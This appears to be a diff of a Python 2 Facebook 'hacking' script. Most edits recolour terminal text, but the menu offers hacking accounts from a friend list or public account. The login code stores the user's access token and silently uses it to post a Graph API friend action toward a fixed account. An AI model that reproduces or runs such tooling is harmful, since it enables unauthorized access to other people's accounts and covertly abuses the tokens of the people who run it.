@@ -98,30 +98,30 @@ print  """
 \033[1;97m #   #  #             #  #   #         # #
 \033[1;97m  # #   #             #   #  #        #   #
 \033[1;97m   #    #######       #    # ####### #     #
-\033[1;97m•─────────────────────────────────────•
+\033[1;97m•───────────────────────────────────────────•
 \033[1;97m__   __          _             __   ___   _
 \033[1;97m\ \ / /__ _ _ __(_)___ _ _    /  \ |_  ) / |
 \033[1;97m \ V / -_) '_(_-< / _ \ ' \  | () | / / _| |
 \033[1;97m  \_/\___|_| /__/_\___/_||_|  \__(_)___(_)_|
-\033[1;97m•─────────────────────────────────────•
+\033[1;97m•───────────────────────────────────────────•
  """
 CorrectUsername = "kalilinux"
 CorrectPassword = "Facebook"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;92m")
+    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;97m")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;92m")
+    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username #Dev:Babar_Ali
 	    time.sleep(2)
             loop = 'false'
         else:
-            print "\033[1;93mWrong Password"
+            print "\033[1;97mWrong Password"
             os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
     else:
-        print "\033[1;94mWrong Username"
+        print "\033[1;97mWrong Username"
         os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
 
 ##### LICENSE #####
@@ -211,7 +211,7 @@ def login1():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;95mLogin Successful•'
+				print '\033[1;47m\033[1;91mLogin Successful\033[1;0m'
 				os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -224,7 +224,7 @@ def login1():
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
+			print("\n\x1b[1;97mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -360,7 +360,7 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m[1]\033[1;47m\033[1;91mHack From Friend List \033[1;0m"
+	print "\033[1;97m[1]\033[1;47m\033[1;91mHack From Friend List    \033[1;0m"
 	time.sleep(0.05)
 	print "\033[1;97m[2]\033[1;47m\033[1;91mHack From Public Account \033[1;0m"
 	time.sleep(0.05)
@@ -369,7 +369,7 @@ def super():
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;94mChoose an Option: \033[1;97m")
+	peak = raw_input("\n\033[1;97m[+]\033[1;94mSelect Option: \033[1;97m")
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_super()
